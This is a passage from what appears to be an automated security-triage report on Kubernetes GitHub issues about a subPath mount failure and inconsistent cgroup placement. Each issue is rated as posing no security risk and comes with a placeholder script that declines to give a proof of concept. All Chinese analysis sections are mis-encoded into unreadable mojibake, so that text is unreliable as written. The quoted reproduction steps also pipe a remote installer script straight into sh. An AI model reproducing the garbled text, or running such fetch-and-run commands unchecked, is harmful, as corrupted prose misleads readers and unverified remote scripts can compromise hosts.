4.  **ç»“è®º**ï¼šåŸºäºç°æœ‰ä¿¡æ¯ï¼Œè¯¥ Issue æè¿°çš„æ˜¯ä¸€ä¸ªåŠŸèƒ½å¥å£®æ€§å’Œå¯ç”¨æ€§æ–¹é¢çš„é—®é¢˜ï¼Œè™½ç„¶ä¼šå¯¼è‡´ç‰¹å®šèµ„æºçš„ DoSï¼Œä½†æ²¡æœ‰æ˜ç¡®è¿¹è±¡è¡¨æ˜å®ƒæ˜¯ä¸€ä¸ªå¯è¢«å¸¸è§„ç”¨æˆ·æˆ–è¿œç¨‹æ”»å‡»è€…åˆ©ç”¨çš„å®‰å…¨æ¼æ´ã€‚å…¶è§¦å‘æ¡ä»¶ä¸æ¸…æ™°ä¸”ä¼¼ä¹ä¸ç³»ç»Ÿå†…éƒ¨çŠ¶æ€æœ‰å…³ï¼Œè€Œéå¤–éƒ¨æ¶æ„è¾“å…¥ã€‚å› æ­¤ï¼Œæ ¹æ®æä¾›çš„é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œç‰¹åˆ«æ˜¯è€ƒè™‘åˆ° DoS çš„è§¦å‘æ¡ä»¶å’Œå½±å“èŒƒå›´ï¼Œä»¥åŠç¼ºä¹æ˜ç¡®çš„å®‰å…¨åˆ©ç”¨åœºæ™¯ï¼Œæ­¤é—®é¢˜ä¸åº”è¢«å½’ç±»ä¸ºå®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# Risk assessment is "Not Involved", no POC script required.
# The issue describes a lack of reliability (no retry mechanism for UDS connection)
# rather than a security vulnerability that can be actively exploited by an attacker
# according to the provided information. Reproducing this would involve setting up
# a device plugin, running workloads for a long time, and observing the connection
# drop, which is hard to reliably trigger on demand and doesn't demonstrate
# a security exploit.
```


**è§£é‡Šè¯´æ˜ï¼š**

ç”±äºåˆ†æç»“è®ºä¸ºè¯¥ Issue **ä¸æ¶‰åŠ**å®‰å…¨é£é™©ï¼Œè€Œä¸»è¦æ˜¯ä¸€ä¸ªå…³äºç³»ç»Ÿå¯é æ€§å’Œå¯ç”¨æ€§çš„åŠŸèƒ½ç¼ºé™·ï¼ˆç¼ºå°‘è¿æ¥é‡è¯•æœºåˆ¶ï¼‰ï¼Œå› æ­¤æ ¹æ®è¦æ±‚ï¼Œæ— éœ€æä¾›ç”¨äºå¤ç°å®‰å…¨æ¼æ´çš„ POC è„šæœ¬ã€‚è¯¥é—®é¢˜çš„å¤ç°æ›´ä¾§é‡äºæ¨¡æ‹Ÿé•¿æ—¶é—´è¿è¡Œæˆ–ç‰¹å®šç³»ç»Ÿæ¡ä»¶ä»¥è§‚å¯Ÿè¿æ¥æ–­å¼€ï¼Œè€Œéæ¨¡æ‹Ÿæ”»å‡»è¡Œä¸ºã€‚

---


## Issue #130999 ConfigMap SubPath Volume Mount failed on `util-linux=2.41`

- Issue é“¾æ¥ï¼š[#130999](https://github.com/kubernetes/kubernetes/issues/130999)

### Issue å†…å®¹

#### What happened?

Mount command executes failed when creating a Pod using ConfigMap SubPath volume after upgrading `util-linux` to `2.41`.

`kubectl describe pod` Events: 

```log
Error: failed to generate container "ddcc1d587faca0a37bc7ee0bf46abbf7ce009c31a838f00f7a2a640667b713da" spec: failed to generate spec: failed to mkdir "/var/lib/kubelet/pods/ed5ba81a-2777-4ac9-a986-33238d803bdf/volume-subpaths/config/demo/0": mkdir /var/lib/kubelet/pods/ed5ba81a-2777-4ac9-a986-33238d803bdf/volume-subpaths/config/demo/0: file exists
```

`journalctl -u k3s`:

```log
Mar 22 14:22:06 archlinux k3s[6466]: Unmounting arguments: /var/lib/kubelet/pods/bf088366-22fe-495e-a0f3-f78aeece8cbf/volume-subpaths/config/demo/0
Mar 22 14:22:06 archlinux k3s[6466]: Output: umount: can't unmount /var/lib/kubelet/pods/bf088366-22fe-495e-a0f3-f78aeece8cbf/volume-subpaths/config/demo/0: Permission denied
Mar 22 14:22:07 archlinux k3s[6466]: E0322 14:22:07.978619    6466 pod_workers.go:1301] "Error syncing pod, skipping" err="failed to \"StartContainer\" for \"demo\" with ImagePullBackOff: \"Back-off pulling image \\\"alpine\\\"\"" pod="default/test" pod>
Mar 22 14:22:32 archlinux k3s[6466]: E0322 14:22:32.833710    6466 mount_linux.go:282] Mount failed: exit status 32
Mar 22 14:22:32 archlinux k3s[6466]: Mounting command: mount
Mar 22 14:22:32 archlinux k3s[6466]: Mounting arguments: --no-canonicalize -o bind /proc/6466/fd/274 /var/lib/kubelet/pods/ed5ba81a-2777-4ac9-a986-33238d803bdf/volume-subpaths/config/demo/0
Mar 22 14:22:32 archlinux k3s[6466]: Output: mount: /var/lib/kubelet/pods/ed5ba81a-2777-4ac9-a986-33238d803bdf/volume-subpaths/config/demo/0: move_mount() failed: No such file or directory.
Mar 22 14:22:32 archlinux k3s[6466]:        dmesg(1) may have more information after failed mount system call.
Mar 22 14:22:32 archlinux k3s[6466]: E0322 14:22:32.834019    6466 subpath_linux.go:219] Failed to clean subpath "/var/lib/kubelet/pods/ed5ba81a-2777-4ac9-a986-33238d803bdf/volume-subpaths/config/demo/0": error cleaning subpath mount /var/lib/kubelet/po>
Mar 22 14:22:32 archlinux k3s[6466]: E0322 14:22:32.834070    6466 kubelet_pods.go:349] "Failed to prepare subPath for volumeMount of the container" err=<
Mar 22 14:22:32 archlinux k3s[6466]:         error mounting /var/lib/kubelet/pods/ed5ba81a-2777-4ac9-a986-33238d803bdf/volumes/kubernetes.io~configmap/config/..2025_03_22_14_20_59.1325584633/test.conf: mount failed: exit status 32
Mar 22 14:22:32 archlinux k3s[6466]:         Mounting command: mount
Mar 22 14:22:32 archlinux k3s[6466]:         Mounting arguments: --no-canonicalize -o bind /proc/6466/fd/274 /var/lib/kubelet/pods/ed5ba81a-2777-4ac9-a986-33238d803bdf/volume-subpaths/config/demo/0
Mar 22 14:22:32 archlinux k3s[6466]:         Output: mount: /var/lib/kubelet/pods/ed5ba81a-2777-4ac9-a986-33238d803bdf/volume-subpaths/config/demo/0: move_mount() failed: No such file or directory.
Mar 22 14:22:32 archlinux k3s[6466]:                dmesg(1) may have more information after failed mount system call.
Mar 22 14:22:32 archlinux k3s[6466]:  > containerName="demo" volumeMountName="config"
```

> The `dmesg` does not show any error messages related to the `mount` command. 

https://github.com/user-attachments/assets/34ea22cb-484b-4a1d-b958-1358ff59dc25

#### What did you expect to happen?

Pod using ConfigMap SubPath volumes should be created successfully.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Bump `util-linux` version `2.41`.
    ````console
    # pacman -Si util-linux
    Repository      : core
    Name            : util-linux
    Version         : 2.41-2
    ....
    ````
2. Install K3s or RKE2.
    ```bash
    # export INSTALL_K3S_MIRROR=cn   # Uncomment if install K3s in China regions.
    curl -sfL https://rancher-mirror.rancher.cn/k3s/k3s-install.sh | \
        INSTALL_K3S_VERSION=v1.31.6+k3s1 \
        sh -s - server \
        --cluster-init

    # After the K3s server ready
    mkdir -p ~/.kube/config
    cat /etc/rancher/k3s/k3s.yaml > ~/.kube/config
    ```
3. Apply the following example ConfigMap and Pod configuration.
```yaml
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: test
data:
  test.conf: |
    AAA=FOO
    BBB=BAR
---
apiVersion: v1
kind: Pod
metadata:
  name: test
spec:
  containers:
    - name: demo
      image: alpine
      command: ["sleep", "3600"]
      volumeMounts:
      - name: config
        mountPath: "/config"
        subPath: "test.conf"
  volumes:
  # You set volumes at the Pod level, then mount them into containers inside that Pod
  - name: config
    configMap:
      # Provide the name of the ConfigMap you want to mount.
      name: test
      items:
        - key: test.conf
          path: test.conf

```
4. Pod failed to create with following error in events.

```log
# kubectl describe pod test
 Warning  Failed     49m                  kubelet            Error: failed to generate container "ddcc1d587faca0a37bc7ee0bf46abbf7ce009c31a838f00f7a2a640667b713da" spec: failed to generate spec: failed to mkdir "/var/lib/kubelet/pods/ed5ba81a-2777-4ac9-a986-33238d803bdf/volume-subpaths/config/demo/0": mkdir /var/lib/kubelet/pods/ed5ba81a-2777-4ac9-a986-33238d803bdf/volume-subpaths/config/demo/0: file exists
```

#### Anything else we need to know?

```console
# kubectl get nodes
NAME        STATUS   ROLES                       AGE     VERSION
archlinux   Ready    control-plane,etcd,master   5h58m   v1.31.6+k3s1
```

#### Kubernetes version

<details>

```console
# kubectl version
Client Version: v1.32.3
Kustomize Version: v5.5.0
Server Version: v1.31.6+k3s1
```

</details>


#### Cloud provider

<details>
Not using a public cloud.

The RKE2 / K3s are installed on the KVM and bare metal machines.
</details>


#### OS version

<details>

```console
[root@archlinux ~]# cat /etc/os-release 
NAME="Arch Linux"
PRETTY_NAME="Arch Linux"
ID=arch
BUILD_ID=rolling
ANSI_COLOR="38;2;23;147;209"
HOME_URL="https://archlinux.org/"
DOCUMENTATION_URL="https://wiki.archlinux.org/"
SUPPORT_URL="https://bbs.archlinux.org/"
BUG_REPORT_URL="https://gitlab.archlinux.org/groups/archlinux/-/issues"
PRIVACY_POLICY_URL="https://terms.archlinux.org/docs/privacy-policy/"
LOGO=archlinux-logo

$ uname -a
Linux archlinux 6.13.7-arch1-1 #1 SMP PREEMPT_DYNAMIC Thu, 13 Mar 2025 18:12:00 +0000 x86_64 GNU/Linux

```

</details>


#### Install tools

<details>
K3s and RKE2
</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†ä¸€ä¸ªåœ¨å°†`util-linux`åŒ…å‡çº§åˆ°`2.41`ç‰ˆæœ¬åï¼Œä½¿ç”¨ConfigMap SubPathæ–¹å¼æŒ‚è½½Volumeçš„Podæ— æ³•æˆåŠŸåˆ›å»ºçš„é—®é¢˜ã€‚é”™è¯¯æ—¥å¿—æ˜¾ç¤º`kubelet`åœ¨å°è¯•ä¸ºsubPathåˆ›å»ºæŒ‚è½½ç‚¹æ—¶é‡åˆ°äº†`mkdir ...: file exists`ä»¥åŠåç»­çš„`mount ... move_mount() failed: No such file or directory`å’Œ`umount: ... Permission denied`é”™è¯¯ã€‚

æ ¸å¿ƒé—®é¢˜åœ¨äº`kubelet`ï¼ˆåœ¨K3s/RKE2ç¯å¢ƒä¸­ï¼‰ä¸æ–°ç‰ˆæœ¬`util-linux`ï¼ˆç‰¹åˆ«æ˜¯å…¶`mount`å‘½ä»¤çš„è¡Œä¸ºæˆ–ä¾èµ–ï¼‰ä¹‹é—´å­˜åœ¨å…¼å®¹æ€§é—®é¢˜ï¼Œå¯¼è‡´æ ‡å‡†çš„subPathæŒ‚è½½æµç¨‹å¤±è´¥ã€‚è¿™æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§Bugï¼Œå½±å“äº†ä¾èµ–è¯¥ç‰¹æ€§çš„åº”ç”¨çš„éƒ¨ç½²å’Œè¿è¡Œã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š
1.  **éå®‰å…¨é—®é¢˜**ï¼šè¯¥é—®é¢˜æ˜¯ç”±äºåº•å±‚ä¾èµ–åº“ç‰ˆæœ¬å˜æ›´å¯¼è‡´çš„Kubernetesæ ¸å¿ƒåŠŸèƒ½ï¼ˆsubPathæŒ‚è½½ï¼‰å¤±æ•ˆï¼Œå±äºåŠŸèƒ½æ€§é—®é¢˜æˆ–å…¼å®¹æ€§é—®é¢˜ï¼Œå¹¶æœªå¼•å…¥æ–°çš„æ”»å‡»å‘é‡æˆ–æš´éœ²æ•æ„Ÿä¿¡æ¯ã€‚å®ƒé˜»æ­¢äº†Podçš„æ­£å¸¸å¯åŠ¨ï¼Œå½±å“äº†å¯ç”¨æ€§ï¼Œä½†ä¸æ˜¯ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚
2.  **å½±å“**ï¼šä¸»è¦å½±å“æ˜¯ä½¿ç”¨äº†ConfigMap SubPathæŒ‚è½½çš„Podæ— æ³•å¯åŠ¨ï¼Œå¯¼è‡´ä¾èµ–æ­¤é…ç½®çš„æœåŠ¡ä¸å¯ç”¨ã€‚
3.  **DoSå¯èƒ½æ€§**ï¼šè™½ç„¶è¿™ä¼šå¯¼è‡´æœåŠ¡æ— æ³•å¯åŠ¨ï¼Œå¯ä»¥çœ‹ä½œä¸€ç§æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰ï¼Œä½†è§¦å‘æ¡ä»¶æ˜¯ç”¨æˆ·ï¼ˆæˆ–ç®¡ç†å‘˜ï¼‰å°è¯•éƒ¨ç½²ä¸€ä¸ªä½¿ç”¨ç‰¹å®šåŠŸèƒ½çš„Podã€‚æ”»å‡»è€…å¦‚æœå·²ç»æ‹¥æœ‰åˆ›å»ºPodçš„æƒé™ï¼Œä»–ä»¬å¯ä»¥é€šè¿‡éƒ¨ç½²è¿™ç§ï¼ˆå½“å‰ç‰ˆæœ¬ä¸‹ï¼‰æ— æ³•è¿è¡Œçš„Podæ¥æ¶ˆè€—èµ„æºæˆ–é˜»æ­¢æœåŠ¡å¯åŠ¨ï¼Œä½†è¿™å¹¶æœªè¶…å‡ºä»–ä»¬å·²æœ‰æƒé™æ‰€èƒ½é€ æˆçš„å½±å“èŒƒå›´ã€‚æ ¹æ®è§„åˆ™5ï¼Œè¿™ç§éœ€è¦åˆ›å»ºæƒé™æ‰èƒ½è§¦å‘çš„DoSåœºæ™¯ï¼Œä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚
4.  **å…¶ä»–é£é™©**ï¼šæ—¥å¿—ä¸­å¹¶æœªæ³„éœ²å‡­æ®ï¼ˆè§„åˆ™6ï¼‰ï¼Œé—®é¢˜æè¿°ä¹Ÿä¸æ¶‰åŠå‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ã€ææƒç­‰é«˜å±é£é™©ï¼ˆè§„åˆ™7ï¼‰ï¼Œä¹Ÿéå¤šç”¨æˆ·åœºæ™¯ä¸‹ä½æƒé™å½±å“é«˜æƒé™ç”¨æˆ·çš„é—®é¢˜ï¼ˆè§„åˆ™8ï¼‰ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥Issueæè¿°çš„æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§Bugï¼Œè€Œéå®‰å…¨æ¼æ´ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# è¯¥Issueè¢«è¯„å®šä¸º"ä¸æ¶‰åŠ"å®‰å…¨é£é™©ï¼Œä¸»è¦æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§Bugã€‚
# æ ¹æ®è¦æ±‚ï¼Œä»…é’ˆå¯¹é«˜é£é™©é—®é¢˜æä¾›å¤ç°POCã€‚
# å› æ­¤ï¼Œæ­¤å¤„ä¸æä¾›å¤ç°è„šæœ¬ã€‚

def main():
    print("è¯¥Issueè¢«è¯„å®šä¸º'ä¸æ¶‰åŠ'å®‰å…¨é£é™©ï¼Œä¸»è¦æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§Bugã€‚")
    print("æ ¹æ®è¦æ±‚ï¼Œä»…é’ˆå¯¹é«˜é£é™©é—®é¢˜æä¾›å¤ç°POCã€‚")
    print("å› æ­¤ï¼Œä¸æä¾›å¤ç°è„šæœ¬ã€‚")

# ç›´æ¥è°ƒç”¨ main å‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥IssueæŠ¥å‘Šäº†ä¸€ä¸ªåœ¨ç‰¹å®šç¯å¢ƒï¼ˆ`util-linux` >= 2.41ï¼‰ä¸‹ï¼ŒKubernetes/K3sçš„ConfigMap SubPath VolumeæŒ‚è½½åŠŸèƒ½å¤±è´¥çš„é—®é¢˜ã€‚è¿™æ˜¯ä¸€ä¸ªç”±è½¯ä»¶ç‰ˆæœ¬å…¼å®¹æ€§å¼•èµ·çš„**åŠŸèƒ½æ€§Bug**ï¼Œå¯¼è‡´é…ç½®äº†ç‰¹å®šVolumeæŒ‚è½½æ–¹å¼çš„Podæ— æ³•å¯åŠ¨ï¼Œå½±å“äº†æœåŠ¡çš„å¯ç”¨æ€§ã€‚

ç”±äºè¯¥é—®é¢˜å¹¶æœªå¼•å…¥æ–°çš„å®‰å…¨æ”»å‡»é¢ï¼Œä¾‹å¦‚è¿œç¨‹ä»£ç æ‰§è¡Œã€æƒé™æå‡ã€ä¿¡æ¯æ³„éœ²æˆ–è¶Šæƒè®¿é—®ç­‰ï¼Œå®ƒä¸è¢«è§†ä¸ºä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚å°½ç®¡å®ƒä¼šå¯¼è‡´æœåŠ¡ä¸­æ–­ï¼ˆä¸€ç§å½¢å¼çš„DoSï¼‰ï¼Œä½†è§¦å‘è¯¥é—®é¢˜éœ€è¦ç”¨æˆ·å…·æœ‰åœ¨é›†ç¾¤ä¸­åˆ›å»ºPodçš„æƒé™ï¼Œå¹¶ä¸”å½±å“çš„æ˜¯ç”¨æˆ·è‡ªå·±å°è¯•åˆ›å»ºçš„Podã€‚æ ¹æ®æä¾›çš„é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œç‰¹åˆ«æ˜¯è§„åˆ™2å’Œè§„åˆ™5ï¼Œæ­¤ç±»é—®é¢˜ä¸å½’ç±»ä¸ºå®‰å…¨é£é™©ï¼Œå°¤å…¶æ˜¯é«˜é£é™©ã€‚

å› æ­¤ï¼Œé£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ï¼Œå¹¶ä¸”æŒ‰ç…§è¦æ±‚ï¼Œæ— éœ€æä¾›å¤ç°POCè„šæœ¬ã€‚æä¾›çš„Pythonä»£ç ä»…åŒ…å«æ³¨é‡Šå’Œæ‰“å°è¯­å¥ï¼Œè¯´æ˜ä¸ç”ŸæˆPOCçš„åŸå› ã€‚

---


## Issue #130982 Inconsistent cgroup placement and naming between containerd and CRI-O with user namespaces

- Issue é“¾æ¥ï¼š[#130982](https://github.com/kubernetes/kubernetes/issues/130982)

### Issue å†…å®¹

#### What happened?

When running Kubernetes with user namespaces enabled, there is an inconsistency in cgroup hierarchy and naming convention between containerd and CRI-O.

## Containerd behavior (using user namespace)
 * **Sandbox cgroup** is created inside `kubepods.slice`
 * **Container cgroup** is placed under `system.slice` instead of `kubepods.slice`, using a non-standard format that includes `slice:cri-containerd:<container_id>`
```bash
/sys/fs/cgroup/
â”œâ”€â”€ kubepods.slice
â”‚   â”œâ”€â”€ kubepods-besteffort.slice
â”‚   â”‚   â””â”€â”€ kubepods-besteffort-pod<pod_id>.slice 
â”‚   â”‚       â””â”€â”€ cri-containerd-<sandbox_id>.scope
â”‚   ...
â”œâ”€â”€ system.slice
â”‚   â”œâ”€â”€ kubepods-besteffort-pod<pod_id>.slice:cri-containerd:<continer_id>
```

## Containerd behavior (without user namespace)
```bash
/sys/fs/cgroup/
â”œâ”€â”€ kubepods.slice
â”‚   â”œâ”€â”€ kubepods-besteffort.slice
â”‚   â”‚   â””â”€â”€ kubepods-besteffort-pod<pod_id>.slice 
â”‚   â”‚       â”œâ”€â”€ cri-containerd-<sandbox_id>.scope
â”‚   â”‚       â””â”€â”€ cri-containerd-<continer_id>.scope
```

It looks inconsistent because:
 * Cgroup of container that use user namespaces should be inside `kubepods.slice` just like the sandbox.
 * Naming convention is different depending on the use of userns.

## CRI-O behavior (with and without user namespaces)
 * Container and sandbox cgroups are always placed in the same location and follow a consistent naming format, whether user namespaces are enabled or not.
```bash
/sys/fs/cgroup/
â”œâ”€â”€ kubepods.slice
â”‚   â”œâ”€â”€ kubepods-besteffort.slice
â”‚   â”‚   â”œâ”€â”€ kubepods-besteffort-pod<pod_id>.slice
â”‚   â”‚   â”‚   â”œâ”€â”€ crio-<sandbox_id>
â”‚   â”‚   â”‚   â””â”€â”€ crio-<container_id>.scope
â”‚   â”‚   â”‚       â””â”€â”€ container
â”œâ”€â”€ system.slice
â”‚   â”œâ”€â”€ crio-conmon-<container_id>.scope
```









#### What did you expect to happen?

Both container runtimes should follow **consistent cgroup hierarchy and naming rules:**

 * Container cgroups should be placed inside `kubepods.slice`, not `system.slice` (as containerd currently does).

 * **Naming should follow a predictable format**, rather than using `slice:cri-containerd:<container_id>`.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Enable user namespaces [Use a User Namespace With a Pod](https://kubernetes.io/docs/tasks/configure-pod-container/user-namespaces/).
2. Deploy a pod on both container runtimes (containerd and CRI-O).
3. Compare the resulting cgroup hierarchy under: `/sys/fs/cgroup/`

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.32.2+k3s1
Kustomize Version: v5.5.0
Server Version: v1.32.2+k3s1
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 24.04.2 LTS"
NAME="Ubuntu"
VERSION_ID="24.04"
VERSION="24.04.2 LTS (Noble Numbat)"
VERSION_CODENAME=noble
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=noble
LOGO=ubuntu-logo

$ uname -a
Linux 6.11.0-17-generic #17~24.04.2-Ubuntu SMP PREEMPT_DYNAMIC Mon Jan 20 22:48:29 UTC 2 x86_64 x86_64 x86_64 GNU/Linux


```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
Container runtime 1: containerd v2.0.2
Container runtime 2: CRI-O v1.32.2
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
æ­¤ Issue æè¿°äº†åœ¨ä½¿ç”¨ç”¨æˆ·å‘½åç©ºé—´ (user namespaces) æ—¶ï¼Œ`containerd` å’Œ `CRI-O` è¿™ä¸¤ä¸ªå®¹å™¨è¿è¡Œæ—¶åœ¨ cgroup å±‚çº§ç»“æ„å’Œå‘½åçº¦å®šæ–¹é¢å­˜åœ¨ä¸ä¸€è‡´æ€§ã€‚

å…·ä½“æ¥è¯´ï¼š
1.  `containerd` åœ¨å¯ç”¨ç”¨æˆ·å‘½åç©ºé—´æ—¶ï¼Œä¼šå°†å®¹å™¨ (container) çš„ cgroup æ”¾ç½®åœ¨ `/sys/fs/cgroup/system.slice` ä¸‹ï¼Œè€Œä¸æ˜¯é¢„æœŸçš„ `/sys/fs/cgroup/kubepods.slice` ä¸‹ï¼ˆæ²™ç®± cgroup ä»ç„¶åœ¨ `kubepods.slice` ä¸‹ï¼‰ã€‚
2.  `containerd` åœ¨è¿™ç§æƒ…å†µä¸‹ä½¿ç”¨çš„ cgroup å‘½å (`slice:cri-containerd:<container_id>`) ä¹Ÿä¸ä¸ä½¿ç”¨ç”¨æˆ·å‘½åç©ºé—´æ—¶çš„å‘½å (`cri-containerd-<container_id>.scope`) ä¸åŒã€‚
3.  `CRI-O` åˆ™æ— è®ºæ˜¯å¦ä½¿ç”¨ç”¨æˆ·å‘½åç©ºé—´ï¼Œéƒ½å°†å®¹å™¨å’Œæ²™ç®±çš„ cgroup æ”¾ç½®åœ¨ `kubepods.slice` ä¸‹ï¼Œå¹¶ä½¿ç”¨ä¸€è‡´çš„å‘½åæ ¼å¼ã€‚

è¿™ç§ä¸ä¸€è‡´æ€§ä¸»è¦æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§é—®é¢˜æˆ–é…ç½®ç®¡ç†é—®é¢˜ï¼š
*   å®ƒå¯èƒ½å¯¼è‡´ä¾èµ–ç‰¹å®š cgroup è·¯å¾„æˆ–å‘½åçº¦å®šçš„ç›‘æ§ã€èµ„æºç®¡ç†æˆ–ç­–ç•¥æ‰§è¡Œå·¥å…·å‡ºç°è¡Œä¸ºå¼‚å¸¸ã€‚
*   å®ƒç ´åäº†ä¸åŒå®¹å™¨è¿è¡Œæ—¶ä¹‹é—´ä»¥åŠåŒä¸€è¿è¡Œæ—¶ä¸åŒé…ç½®ä¸‹è¡Œä¸ºçš„ä¸€è‡´æ€§ã€‚

ç„¶è€Œï¼Œæ ¹æ® Issue æä¾›çš„ä¿¡æ¯ï¼Œè¿™ç§ cgroup æ”¾ç½®å’Œå‘½åçš„ä¸ä¸€è‡´æ€§æœ¬èº«å¹¶æœªç›´æ¥å¼•å…¥å¯åˆ©ç”¨çš„å®‰å…¨æ¼æ´ï¼š
*   **æ²¡æœ‰ä¿¡æ¯æ³„éœ²**ï¼šIssue æœªæè¿°æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚å‡­è¯ï¼‰å› æ­¤è€Œè¢«æš´éœ²ã€‚
*   **æ²¡æœ‰æƒé™æå‡æˆ–é€ƒé€¸**ï¼šIssue æœªæè¿°æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ç§ cgroup ç»“æ„å·®å¼‚æ¥æå‡æƒé™ã€é€ƒé€¸å®¹å™¨æˆ–è®¿é—®æœªæˆæƒèµ„æºã€‚cgroup çš„ä¸»è¦ä½œç”¨æ˜¯èµ„æºé™åˆ¶å’Œéš”ç¦»ï¼Œè™½ç„¶é…ç½®é”™è¯¯å¯èƒ½å¯¼è‡´èµ„æºæ»¥ç”¨ï¼ˆDoSï¼‰ï¼Œä½†ä»…ä»…æ˜¯è·¯å¾„å’Œå‘½åçš„ä¸ä¸€è‡´ï¼Œä¸ç›´æ¥ç­‰åŒäºéš”ç¦»è¢«ç ´åæˆ–æƒé™è¢«æå‡ã€‚
*   **æ²¡æœ‰è¿œç¨‹ä»£ç æ‰§è¡Œ**ï¼šIssue ä¸ä»£ç æ‰§è¡Œæ— å…³ã€‚
*   **é DoS æ¼æ´åˆ©ç”¨**ï¼šè™½ç„¶ cgroup ä¸èµ„æºé™åˆ¶æœ‰å…³ï¼Œä½† Issue æè¿°çš„æ˜¯ cgroup çš„ *ä½ç½®* å’Œ *åç§°* ä¸ä¸€è‡´ï¼Œè€Œä¸æ˜¯ cgroup é™åˆ¶æœ¬èº«è¢«ç»•è¿‡æˆ–å¯ä»¥è¢«æ¶æ„ä¿®æ”¹ã€‚å³ä½¿æœ‰æ½œåœ¨çš„ DoS å½±å“ï¼ˆä¾‹å¦‚ï¼Œèµ„æºç»Ÿè®¡æˆ–é™åˆ¶å·¥å…·å¤±æ•ˆï¼‰ï¼Œæ ¹æ®æ ‡å‡† 5ï¼Œå¦‚æœéœ€è¦æƒé™ï¼ˆå¦‚åˆ›å»º Pod çš„æƒé™ï¼‰æ‰èƒ½è§¦å‘ï¼Œé€šå¸¸ä¸ä¼šè¯„ä¸ºé«˜é£é™©ã€‚æ­¤ Issue ç”šè‡³æ²¡æœ‰æ˜ç¡®æŒ‡å‡º DoS çš„å¯èƒ½æ€§ã€‚
*   **éå¤šç”¨æˆ·å½±å“ï¼ˆå®‰å…¨å±‚é¢ï¼‰**ï¼šè™½ç„¶å‘ç”Ÿåœ¨å¤šç”¨æˆ·ç¯å¢ƒï¼ˆKubernetesï¼‰ï¼Œä½†æ²¡æœ‰è¯æ®è¡¨æ˜ä¸€ä¸ªç”¨æˆ·å¯ä»¥å› ä¸ºè¿™ä¸ª cgroup ç»“æ„é—®é¢˜è€Œå½±å“åˆ°å…¶ä»–ç”¨æˆ·ï¼ˆåœ¨å®‰å…¨è¾¹ç•Œæ–¹é¢ï¼‰ã€‚ç”¨æˆ·å‘½åç©ºé—´æœ¬èº«å°±æ˜¯ä¸ºäº†å¢å¼ºéš”ç¦»ã€‚

å› æ­¤ï¼Œè¯¥ Issue æŒ‡å‡ºçš„é—®é¢˜æ˜¯åŠŸèƒ½ä¸Šçš„ä¸ä¸€è‡´æ€§ï¼Œè€Œéå¯ä»¥ç›´æ¥åˆ©ç”¨çš„å®‰å…¨é£é™©ã€‚å®ƒè¿åäº†â€œæœ€å°æƒŠè®¶åŸåˆ™â€ï¼Œå¹¶å¯èƒ½ç»™è¿ç»´å¸¦æ¥å›°æ‰°ï¼Œä½†æ ¹æ®æä¾›çš„é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œå®ƒä¸æ„æˆä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# æ­¤ Issue æè¿°çš„æ˜¯å®¹å™¨è¿è¡Œæ—¶åœ¨ cgroup ç»„ç»‡æ–¹å¼ä¸Šçš„åŠŸèƒ½æ€§ä¸ä¸€è‡´é—®é¢˜ï¼Œ
# å¹¶éä¸€ä¸ªå¯åˆ©ç”¨çš„å®‰å…¨æ¼æ´ã€‚å› æ­¤ï¼Œä¸æä¾›ç”¨äºå®‰å…¨é£é™©å¤ç°çš„ POC è„šæœ¬ã€‚
#
# è¦éªŒè¯è¯¥ Issue ä¸­æè¿°çš„è¡Œä¸ºï¼Œéœ€è¦æŒ‰ç…§ "How can we reproduce it" éƒ¨åˆ†çš„è¯´æ˜ï¼š
# 1. é…ç½® Kubernetes é›†ç¾¤èŠ‚ç‚¹ä»¥å¯ç”¨ç”¨æˆ·å‘½åç©ºé—´ã€‚
# 2. åˆ†åˆ«åœ¨ä½¿ç”¨ containerd å’Œ CRI-O ä½œä¸ºè¿è¡Œæ—¶çš„èŠ‚ç‚¹ä¸Šéƒ¨ç½² Podã€‚
